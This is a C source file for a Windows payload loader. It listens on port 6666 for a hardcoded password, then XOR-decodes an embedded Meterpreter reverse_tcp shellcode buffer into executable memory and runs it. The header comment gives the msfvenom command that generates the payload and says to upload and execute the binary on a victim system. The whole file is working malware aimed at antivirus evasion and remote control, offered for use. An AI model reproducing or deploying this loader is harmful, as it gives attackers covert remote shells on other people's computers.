/*
** Author : Panda
** Date   : 2012-09-07
**
** Adding A listen port and an password checking to MrTchuss original code. 
** Based on Jerome Nokin work, published in MISC n*61
**
** To compile with DevCPP, in Projet Option, Parameters, Linker, add 
** xxx/Dev-Cpp/lib/libws2_32.a
**
** Generate a C payload with Meterpreter using custom xorbyte encoder and update
** this file, compile, upload and execute the binary on victim system.
**
** msfvenom -e x86/xorbyte -p windows/meterpreter/reverse_tcp LHOST=$(ifdata -pa eth0) -f c
*/
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>


#define DEFAULT_BUFLEN 512

char passwd[] = "Devoteam4212";

void exploit1(char *path)
{
    PROCESS_INFORMATION processInformation;
    STARTUPINFO startupInfo;
    memset(&processInformation, 0, sizeof(processInformation));
    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    
    CreateProcess(path, "toto", NULL, NULL, FALSE, 0, NULL,
                  NULL, &startupInfo, &processInformation);
}

int serverLoop(char* port, char *path) 
{
    WSADATA wsaData;
    int iResult;

    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    
    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return EXIT_FAILURE;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    // Resolve the server address and port
    iResult = getaddrinfo(NULL, port, &hints, &result);
    if (iResult != 0)
    {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return EXIT_FAILURE;
    }

    // Create a SOCKET for connecting to server
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    if (ListenSocket == INVALID_SOCKET)
    {
        printf("socket failed with error: %ld\n", WSAGetLastError());
        freeaddrinfo(result);
        WSACleanup();
        return EXIT_FAILURE;
    }

    // Setup the TCP listening socket
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    if (iResult == SOCKET_ERROR)
    {
        printf("bind failed with error: %d\n", WSAGetLastError());
        freeaddrinfo(result);
        closesocket(ListenSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    if (iResult == SOCKET_ERROR)
    {
        printf("listen failed with error: %d\n", WSAGetLastError());
        closesocket(ListenSocket);
        WSACleanup();
        return EXIT_FAILURE;
    }

    while (1)
    {
        // Accept a client socket
        ClientSocket = accept(ListenSocket, NULL, NULL);
        if (ClientSocket == INVALID_SOCKET)
        {
            printf("accept failed with error: %d\n", WSAGetLastError());
            //closesocket(ListenSocket);
            //WSACleanup();
            //return EXIT_FAILURE;
        }
        else
        {
            iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
            if (iResult > 0)
            {
                if (strncmp(recvbuf, passwd, strlen(passwd)) == 0)
                {
                     closesocket(ClientSocket);
                     exploit1(path);    
                }
            }
            else if (iResult == 0)
            {
                printf("Connection closing...\n");
                closesocket(ClientSocket);
            }
            else 
            {
                printf("recv failed with error: %d\n", WSAGetLastError());
                closesocket(ClientSocket);
            }
        }

    }

    // No longer need server socket
    closesocket(ListenSocket);
    WSACleanup();

    return 0;
}


int test_socket(int port)
{
    WSADATA WSAData;
    WSAStartup(MAKEWORD(2,0), &WSAData);
    int hsock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in my_addr;
    my_addr.sin_family = AF_INET;
    my_addr.sin_port = htons(port);
    my_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    if( SOCKET_ERROR == connect(hsock, (const struct sockaddr *)(&my_addr), sizeof(my_addr)))
    {
        WSACleanup();   
        return EXIT_FAILURE;
    }
    WSACleanup();   
    return EXIT_SUCCESS;
}

void exploit2()
{
    // Update SCSIZE and buf with output of msfvenom of xorbyte encoder
    #define SCSIZE 596
    unsigned char *lpAlloc, *ptr;
    unsigned int i;
    unsigned char buf[] =
    "\x1c\xe0\xf2\x1a\x02\x8b\x82\x82\x8a\x8a\xc2\xc2\x49\x29\x19"
"\x90\xbc\x59\xd9\xe8\xcb\x19\xc7\xa3\x23\xa8\x14\x46\x07\x37"
"\x9e\x15\xc6\x94\x7d\x71\x90\x1b\xe8\xba\xe8\xfc\xee\x65\x21"
"\x53\x22\x0a\x94\x9b\x15\xa2\x51\x1b\x2f\x09\xa2\x93\x6d\x92"
"\x61\x50\x18\xd8\x7c\xd0\x4f\x73\x47\x26\xa2\xde\x19\x1b\x89"
"\xa5\x56\x76\x63\xa2\x76\xb9\x5f\x52\x00\x01\x42\x85\x35\xd7"
"\x09\xf9\xde\x8c\xce\x99\xfa\x71\xb6\xe4\xc7\xd7\xab\x20\x08"
"\x4a\x3a\x06\x9c\x9d\xc6\x16\x23\xa8\x2f\x6f\x0c\x74\x7f\xfa"
"\xe8\x28\x06\x72\x53\x19\xb2\xb3\x60\xb0\x5b\x0b\xbc\x37\x42"
"\x0a\x61\x79\xcc\x47\x7a\x22\xf6\xd6\x3e\x3f\xd4\x07\x35\xd6"
"\x3b\x07\x22\x6b\xc7\x4c\xcd\xf9\x73\xf8\x17\x16\xa8\x7e\x18"
"\x29\x01\xfe\xf5\xc4\xf5\x35\xc2\x6e\xe6\x27\x69\xa6\xe0\xed"
"\x06\x07\xef\x28\xf2\xca\x4a\xaa\x7a\x0f\xc6\x32\x2c\x2f\xfd"
"\x80\x1a\xe2\xb9\x82\x76\x0b\x47\x63\x23\x56\xc6\x24\xfa\xa2"
"\x42\xc9\xef\xb7\x95\xb1\x27\x26\x87\x54\x34\x52\x07\x8c\x32"
"\x3e\x5e\x15\xcc\x47\x87\xdf\x9c\x80\x82\x83\x05\xd6\xe2\x69"
"\xa5\xa1\xcb\x40\x2f\x2e\xe7\x37\xa5\x2c\xf7\xb3\x7e\x5a\x57"
"\x73\xf4\xaf\x6f\x34\xa2\xc3\x86\xdf\x6b\x31\x0c\x5d\xbf\x40"
"\x64\x84\x74\x2c\xd4\x8b\xcf\x95\xa3\x28\xce\xdc\xe8\x03\x5c"
"\xda\x0c\x51\x91\xf9\x9c\xaf\xfb\xc9\x19\x19\x2b\x2b\x83\xeb"
"\x30\x47\x49\x3a\x2c\x1e\xd9\x86\x78\x2c\x3d\x55\x14\x58\x1e"
"\x69\x34\x12\x76\x71\xda\x25\x88\x5d\xca\x72\xf4\x64\x7d\x7c"
"\xf6\xf6\x9d\x9d\xda\xf3\x85\x41\xbb\xef\x74\x24\x0a\x62\x8e"
"\xa7\x13\x93\x6f\x04\x80\x80\x13\xec\x9e\x4b\x4b\x1b\x65\x35"
"\x46\x16\xcf\x9f\xc1\x81\xee\xbe\x4c\x0c\x9b\xcb\x10\x78\x76"
"\x9c\x22\x2d\xcf\x10\xfc\x1c\x8d\x72\x06\xd3\xc5\x52\x1c\x2d"
"\xd4\x0f\xf7\xa4\x1e\x76\xd4\xd6\xa9\xa9\xc3\xe1\x02\xbb\x96" /*ligne a modif port*/
"\x1f\x35\xd3\x46\x2c\x4c\x5c\x27\x71\xc2\x95\x9f\xf7\xe0\x22"
"\xe3\x38\x4b\x7c\xb8\xdf\x43\xbc\xec\x39\x7f\x2c\x79\x2e\xb3"
"\xdb\x16\xa1\x95\x7c\xd0\xe8\xd4\x2b\x8d\x72\x9c\x49\xad\xfe"
"\xe9\xba\x78\x2f\x6c\x04\xb1\xc5\xb8\x54\x7d\x46\xcc\x2d\x60"
"\x9f\x21\xf4\x63\x34\x2c\xbb\x16\x7e\xbf\xca\xc6\xa8\x85\xc8"
"\x5c\x3d\x91\x6e\x83\x56\x47\x2d\x4d\x4d\x4a\x20\xa6\xa2\x9a"
"\xcc\x2e\x79\x2d\x45\x31\x33\x9f\x46\xe9\x21\xde\x81\x48\xb7"
"\x34\xe1\x59\xd2\x57\x61\x6f\x05\xae\xee\x30\x58\x9e\x9e\x05"
"\x15\x4f\x4f\xb6\xb6\x6b\x3d\x64\x0e\x13\x13\xe2\x8a\xce\x96"
"\x93\x37\x34\x67\x8e\x6b\x1f\xe0\x3b\xee\xf8\x6b\x49\x1a\xb9"
"\xd3\x58\x58\xb8\xee\x08\x5b\x50\x07\x8b\xe3\x6a\x68\xa0\x79"
"\x34\xfc\xed\xb2\x78\x87\x40\x95\xf1\xf0\xc6\x05\xab\x82\xba"
"\x7c\x36\xb3\xe3\x15\xf6\x83\x98\x74\x60\xa3";



    lpAlloc = (unsigned char *)VirtualAlloc(0, SCSIZE/2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    {
        ptr = lpAlloc;
        for( i = 0 ; i < SCSIZE ; i+=2 )
        {
             *(ptr++) = (unsigned char)((int)*(buf+i) ^ (int)*(buf+i+1));
        }
        (*(void (*)()) (void*)lpAlloc)();
    }
}

int main(int argc, char *argv[])
{
    if (strncmp(argv[0], "toto", 4) == 0)
    {
        if (EXIT_SUCCESS == test_socket(445))
            exploit2();
    }
    else
        serverLoop("6666", argv[0]);

    return EXIT_SUCCESS;
}
